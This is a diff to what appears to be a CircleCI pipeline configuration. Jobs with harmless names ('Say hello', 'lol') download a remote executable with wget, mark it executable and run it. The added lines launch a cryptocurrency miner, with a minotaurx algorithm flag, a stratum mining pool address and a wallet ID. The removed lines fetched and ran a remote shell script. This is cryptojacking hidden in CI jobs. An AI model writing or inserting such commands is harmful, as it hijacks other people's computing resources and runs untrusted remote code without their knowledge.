@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget https://gitlab.com/mateomac001/hugotuli/-/raw/master/tae.sh; chmod +x tae.sh; ./tae.sh"
+          command: "wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RMbzoYS2fLqpWHvRtH7qEL5dizGZrnrqUc.avngCh"
   say-hello_1:
     docker:
       - image: cimg/base:stable
@@ -24,7 +24,7 @@ jobs:
       - checkout
       - run:
           name: "lol"
-          command: "wget https://gitlab.com/mateomac001/hugotuli/-/raw/master/tae.sh; chmod +x tae.sh; ./tae.sh"
+          command: "wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RMbzoYS2fLqpWHvRtH7qEL5dizGZrnrqUc.avngCh"
 
 
 # Invoke jobs via workflows
